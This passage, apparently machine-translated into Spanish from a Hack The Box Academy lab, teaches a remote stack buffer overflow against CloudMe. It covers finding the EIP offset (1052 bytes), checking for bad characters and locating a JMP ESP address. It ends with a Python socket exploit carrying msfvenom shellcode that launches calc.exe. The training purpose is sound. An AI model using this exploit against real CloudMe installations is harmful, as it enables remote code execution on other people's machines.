Después de difuminar el puerto de escucha, los pasos restantes de identificación y explotación del desbordamiento del búfer deberían ser en gran medida los mismos que los de la explotación del desbordamiento del búfer local. Los principales pasos que seguimos en apartados anteriores fueron:

1. Parámetros de fuzzing
2. Control de EIP
3. Identificar malos personajes
4. Encontrar una instrucción de devolución
5. Saltar a Shellcode

Una vez completada la fuzzing, seguiremos los pasos restantes en esta sección hasta que podamos explotar con éxito la vulnerabilidad de desbordamiento del búfer.

---

## Control de EIP

Comenzaremos creando un patrón único `2000`de longitud en bytes, usando `ERC --pattern c 2000`como lo hicimos anteriormente: ![Patrón remoto](https://academy.hackthebox.com/storage/modules/89/win32bof_remote_pattern.jpg)

Ahora comenzamos a escribir nuestra `eip_offset()`función. Agregaremos nuestra `pattern`variable como con el patrón a continuación `Ascii`en el `Pattern_Create_1.txt`archivo creado en nuestro escritorio, como hicimos con nuestro exploit anterior. Después de eso, para enviar nuestro patrón, podemos usar el mismo código que usamos para difuminar el puerto:

Código: pitón

```python
def eip_offset():
    pattern = bytes("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac"
                    ...SNIP...
                    "5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co", "utf-8")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(pattern)
    s.close()

eip_offset()
```

Una vez que nuestra `eip_offset()`función esté lista, podemos reiniciar nuestro programa `x32dbg`y ejecutar nuestro código, nuestro programa debería fallar y deberíamos ver `EIP`nuestro patrón sobrescrito como `316A4230`: ![Accidente de patrón](https://academy.hackthebox.com/storage/modules/89/win32bof_remote_pattern_crash.jpg)

Ahora podemos usar `ERC --pattern o 1jB0`para calcular el desplazamiento exacto, que se encuentra en `1052`bytes:

![Desplazamiento de patrón](https://academy.hackthebox.com/storage/modules/89/win32bof_remote_pattern_offset.jpg)

Ahora, para asegurarnos de que podemos controlar el valor exacto en `EIP`, usaremos la misma `eip_control()`función de nuestro exploit anterior (mientras cambiamos `offset`), pero usando `socket`para enviar nuestra carga útil en lugar de escribirla en un archivo:

```python
def eip_control():
    offset = 1052
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

eip_control()
```
Una vez más reiniciaremos nuestro programa y ejecutaremos nuestro exploit, y podremos confirmar que controlamos `EIP`ya que sobrescribimos `EIP`con 4 `B`: 
![Control de patrones](https://academy.hackthebox.com/storage/modules/89/win32bof_remote_pattern_control.jpg)
## Identificar malos personajes

Nuestro siguiente paso es identificar si debemos evitar el uso de caracteres incorrectos en nuestra entrada. Podemos comenzar ejecutando `ERC --bytearray`para `x32dbg`crear nuestro `ByteArray_1.bin`archivo. Luego podemos copiar las mismas `bad_chars()`funciones de nuestro exploit anterior y, una vez más, pasar de escribir la carga útil a un archivo a enviarla al puerto:
```python
def bad_chars():
    all_chars = bytes([
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
        ...SNIP...
        0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF
    ])

    offset = 1052
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip + all_chars

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

bad_chars()
```

Una vez que reiniciamos nuestro programa `x32dbg`y ejecutamos nuestro exploit, podemos usar `ERC --compare`para comparar los bytes en la `ESP`dirección con el `ByteArray_1.bin`archivo: ![Comparación de bytes](https://academy.hackthebox.com/storage/modules/89/win32bof_remote_bytes_compare.jpg)

Como podemos ver, todos los bytes coinciden entre la memoria y `ByteArray_1.bin`lo que significa que este programa no tiene ningún carácter malo.
## Encontrar una instrucción de devolución

Ahora que tenemos control `EIP`y sabemos qué caracteres malos evitar en nuestra carga útil, necesitamos encontrar una instrucción para ejecutar la carga útil que colocaremos en la pila. Una vez más, dado que este programa no tiene caracteres malos, podemos usar la `ESP`dirección como remitente. (Intente explotar el programa usándolo `ESP`como dirección de remitente).

Sin embargo, preferiremos usar la dirección de una instrucción integrada dentro del programa para asegurarnos de que se ejecutará en cualquier sistema, ya que estas instrucciones serán las mismas en cualquier sistema. Entonces, primero obtendremos una lista de módulos y bibliotecas cargadas por el programa, y ​​solo consideraremos aquellos que tienen `False`todas las protecciones, que son las siguientes:

```cmd-session
------------------------------------------------------------------------------------------------------------------------ 
Process Name: CloudMe Modules total: 79 
------------------------------------------------------------------------------------------------------------------------ 
 Base          | Entry point   | Size      | Rebase   | SafeSEH  | ASLR    | NXCompat | OS DLL  | Version, Name and Path 
------------------------------------------------------------------------------------------------------------------------ 
 0x400000        0x14c0          0x431000    False      False      False      False      False      C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe\CloudMe.exe 
 0x61b40000      0x1410          0x5f6000    False      False      False      False      False      5.9.0.0;C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll 
 0x69900000      0x1410          0x1c1000    False      False      False      False      False      5.9.0.0;C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe\Qt5Network.dll 
 0x6d9c0000      0x1410          0x4c000     False      False      False      False      False      5.9.0.0;C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe\Qt5Sql.dll 
 0x66e00000      0x1410          0x3d000     False      False      False      False      False      5.9.0.0;C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe\Qt5Xml.dll 
 0x6eb40000      0x1410          0x24000     False      False      False      False      False      C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe\libgcc_s_dw2-1.dll 
 0x6fe40000      0x1410          0x17e000    False      False      False      False      False      C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe\libstdc++-6.dll 
 0x64b40000      0x1410          0x1b000     False      False      False      False      False      1,;WinPthreadGC;C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe\libwinpthread-1.dll 
 0x6aa80000      0x1410          0x1b7000    False      False      False      False      False      5.9.0.0;C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe\platforms\qwindows.dll 
```
Como podemos ver, existen varias bibliotecas cargadas por el programa sin protección de memoria, incluido el `CloudMe.exe`propio programa. Para buscarlos todos `JMP ESP`, podemos ir a la `CPU`pestaña y hacer clic derecho `Search For>All Modules>Command`, luego seleccionar e ingresar `JMP ESP`, y obtendremos una lista de `JMP ESP`instrucciones en los módulos cargados: 
![Encuentra JMP](https://academy.hackthebox.com/storage/modules/89/win32bof_remote_find_jmp_1.jpg)

Si no hubiéramos encontrado ningún resultado, podríamos buscar el `FFE4`patrón en todo el módulo o en todos los módulos, como se mostró en una sección anterior. También podemos buscar otras instrucciones útiles, como `54C3`. En nuestro caso, después de hacer doble clic en el primer resultado para asegurarnos de que sea así `JMP ESP`, podemos copiar la dirección `0069D2E5`y usarla en nuestro exploit. (Intente buscar otras instrucciones y utilícelas como dirección de devolución).
## Saltar a Shellcode

Nuestro último paso es explotar el programa, por lo que comenzaremos creando nuestro código shell para `msfvenom`abrir `calc.exe`como prueba de explotación exitosa:

```shell-session
lilscott6x9@htb[/htb]$ msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python'

...SNIP...
buf =  b""
buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
buf += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
buf += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
...SNIP...
```

Ahora, para crear nuestra `exploit()`función final, primero agregaremos el resultado anterior y usaremos el mismo `payload`de nuestro exploit anterior (mientras cambiamos `offset`la dirección en `eip`). Finalmente, usaremos el mismo código `bad_chars()`para enviar nuestra carga útil al puerto:

Código: pitón

```python
def exploit():
    # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python'
    buf = b""
    ...SNIP...
    buf += b"\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"

    offset = 1052
    buffer = b"A"*offset
    eip = pack('<L', 0x0069D2E5)
    nop = b"\x90"*32
    payload = buffer + eip + nop + buf

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

exploit()
```

Finalmente, podemos ejecutar `CloudMe`(no necesariamente en `x32dbg`) y ejecutar nuestro exploit, deberíamos verlo fallar y debería abrirse una calculadora.

